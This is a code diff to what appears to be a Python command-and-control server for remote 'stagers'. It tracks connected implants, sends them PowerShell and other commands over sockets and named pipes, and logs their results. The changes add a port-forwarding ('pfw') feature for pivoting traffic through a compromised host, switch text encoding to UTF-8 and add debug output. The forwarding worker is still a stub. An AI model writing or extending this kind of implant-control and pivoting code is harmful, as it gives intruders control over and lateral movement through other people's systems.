@@ -64,9 +64,10 @@ class myconstant():
         self.CMD_STAGER_GET_HISTORY = "history"
         self.CMD_STAGER_LOAD_PS = "psload"
         self.CMD_STAGER_CON = "connect"
+        self.CMD_STAGER_PFW = "pfw"
         #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
         self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
-                                    self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON]
+                                    self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW]
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -90,6 +91,8 @@ class myconstant_networking(): #applicaiton layer tag
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
         self.PIPE_CONNECTED = "PIPE_CONNECTED"
+        self.FW_NOTREADY = "FW_NOTREADY"
+        self.FW_SUCCESS = "FW_SUCCESS" #for startup
 
 
 class mybuildin_cmd():
@@ -144,7 +147,7 @@ class mypipe_handler():
                     pass
                 else:
                     raise e
-        return resp[1].decode("ascii", "ignore")
+        return resp[1].decode("utf8", "ignore")
 
 
 # socket is assume connected
@@ -182,7 +185,7 @@ class mysocket_handler():
                 # get more message
                 try: 
                     t_indata = self.__mysocket.recv(1024)
-                    self.__msg_buf = self.__msg_buf + t_indata.decode("ascii", "ignore")
+                    self.__msg_buf = self.__msg_buf + t_indata.decode("utf8", "ignore")
                 except socket.timeout:
                     pass
 
@@ -198,6 +201,8 @@ class myserver():
         self.__mymsg_list = dict()
         self.__myuuid_list = list()
         self.__mystart_list = dict() #bool
+        self.__myfwdata_list_tomaster = dict()
+        self.__myfwdata_list_toslave = dict()
 
         self.__mylistener_start_list = dict() #bool
         self.__mylistener_hostname_list = dict()
@@ -223,6 +228,31 @@ class myserver():
         self.__mypipe_mystart_list = dict() #bool
 
 
+    def start_slave_worker(self,myuuid):
+        #single target for now
+        t_net_constant = myconstant_networking()
+        local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
+        local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
+
+        print("[Stager] This is the local worker for my uuid: {}".format(myuuid))
+        
+        while True:
+            #put command on main que and wait for response
+            self.create_command(myuuid,"fwq","dummy")
+            while True:
+                try:
+                    msg_item = local_item_que_toslave.get(block=True, timeout=5)
+                    break
+                except queue.Empty:
+                    print("[DEBUG] start_slave_worker Local Job Que for {} is empty".format(myuuid))
+                    continue
+            
+            #if msg_item != t_net_constant.FW_NOTREADY:
+            #    print("[Stager] Real data")
+            local_item_que_tomaster.put(t_net_constant.FW_NOTREADY)
+            time.sleep(5)
+        
+
     def start_worker(self,myuuid):
         t_net_constant = myconstant_networking()
         print("[Stager] This is the worker for myuuid: {}".format(myuuid))
@@ -240,6 +270,8 @@ class myserver():
             except queue.Empty:
                 #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                 continue
+            print("[DEBUG] Job item {}".format(cmd_struct_to_send))
+
             
             try:
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
@@ -249,23 +281,60 @@ class myserver():
                 else:
                     myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                 
-                encode_tag = t_mysockethandler.msf_encode(cmd_struct_to_send[0]).encode("ascii", "ignore")
+                encode_tag = t_mysockethandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                 send_result = mysocket.send(encode_tag)
                 myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
                 recv_result = t_mysockethandler.get_nextmsg()
                 myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))
 
-                encode_cmd = t_mysockethandler.msf_encode(cmd_struct_to_send[1]).encode("ascii", "ignore")
+                encode_cmd = t_mysockethandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                 send_result = mysocket.send(encode_cmd)
                 myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                 recv_result = t_mysockethandler.get_nextmsg()
                 myhistory.append("[Stager] Send command result: {}".format(recv_result))
 
+                #if fwq
+                if cmd_struct_to_send[0] == "fwq":
+                    print("[DEBUG] start_worker, I am working for fwq")
+                    #get the next message check tag
+                    recv_result = t_mysockethandler.get_nextmsg()
+                    print("[DEBUG] start_worker, get_nextmsg is {}".format(recv_result))
+                    #push command to local worker and wait for response
+                    local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
+                    local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
+                    print("[DEBUG] start_worker, Trying to put into que")
+                    local_item_que_toslave.put(recv_result)
+                    print("[DEBUG] start_worker, Puted into ..")
+                    while True:
+                        try:
+                            msg_item = local_item_que_tomaster.get(block=True, timeout=5)
+                            break
+                        except queue.Empty:
+                            print("[DEBUG] start_worker, Local Job Que for {} is empty".format(myuuid))
+                            continue
+                    
+                    print("[DEBUG] start_worker, Got item back")
+                    if msg_item != t_net_constant.FW_NOTREADY: #send it back to ack the que get
+                        #send it to client
+                        encode_cmd = t_mysockethandler.msf_encode(msg_item).encode("utf8", "ignore")
+                        send_result = mysocket.send(encode_cmd)
+                    else:
+                        print("[DEBUG] start_worker, FW_NOTREADY")
+                    #else, no need to send back
+                    continue
+                
+                if cmd_struct_to_send[0] == "fw": #fw init
+                    #get ack, no send
+                    recv_result = t_mysockethandler.get_nextmsg()
+                    myhistory.append("[Stager] Run Command result: {}".format(recv_result))
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    continue
+
                 # try get cmd result if any
                 recv_result = t_mysockethandler.get_nextmsg()
                 myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                 # ack for success
-                encode_cmd = t_mysockethandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("ascii", "ignore")
+                encode_cmd = t_mysockethandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("utf8", "ignore")
                 send_result = mysocket.send(encode_cmd)
                 #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
@@ -308,12 +377,12 @@ class myserver():
                 else:
                     myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                 
-                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("ascii", "ignore")
+                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                 win32file.WriteFile(mypipe, encode_tag)
                 recv_result = t_mypipehandler.get_nextmsg()
                 myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))
 
-                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("ascii", "ignore")
+                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                 win32file.WriteFile(mypipe, encode_cmd)
                 recv_result = t_mypipehandler.get_nextmsg()
                 myhistory.append("[Stager] Send command result: {}".format(recv_result))
@@ -322,7 +391,7 @@ class myserver():
                 recv_result = t_mypipehandler.get_nextmsg()
                 myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                 # ack for success
-                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("ascii", "ignore")
+                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("utf8", "ignore")
                 win32file.WriteFile(mypipe, encode_cmd)
                 #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
@@ -381,7 +450,7 @@ class myserver():
             print("Error connecting to client: {}...".format(str(e)))
             return
         
-        if resp[1].decode("ascii", "ignore") == t_net_constant.PIPE_CONNECTED:
+        if resp[1].decode("utf8", "ignore") == t_net_constant.PIPE_CONNECTED:
             print("[Client] Connected to", conhost)
             
             #have everything normally 
@@ -440,6 +509,10 @@ class myserver():
                 self.__myuuid_list.append(myuuid)
                 #set start
                 self.__mystart_list[myuuid] = True
+                #init pfw
+                self.__myfwdata_list_toslave[myuuid] = queue.Queue()
+                self.__myfwdata_list_tomaster[myuuid] = queue.Queue()
+
                 print("[Listener] myuuid is {}".format(myuuid))
                 threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                 
@@ -801,9 +874,31 @@ class mymainclass():
                     #unset auto complete
                     removecomplete()
                     #get host and port
-                    user_input_host = input("Please enter hostname or ip: ")
-                    user_input_port = input("Please enter portnumber: ")
+                    user_input_host = input("Please enter target ip: ")
+                    user_input_port = input("Please enter target port: ")
                     self.__t_myserver.start_client(user_input_host,int(user_input_port))
+
+                if command_id ==  self.__t_myconstant.CMD_STAGER_PFW:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    #unset auto complete
+                    removecomplete()
+                    #get host and port
+                    user_input_listener_host = input("Please enter listener ip: ")
+                    user_input_listener_port = input("Please enter listener port: ")
+                    user_input_con_host = input("Please enter connect ip: ")
+                    user_input_con_port = input("Please enter connect port: ")
+                    # wait local resource handler return true
+                    self.__t_myserver.create_command(user_input_stager,"fw","{}:{}".format(user_input_listener_host,user_input_listener_port))
+                    threading.Thread(target=self.__t_myserver.start_slave_worker,args=(user_input_stager,)).start()
+                    
+                
             #next cmd
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
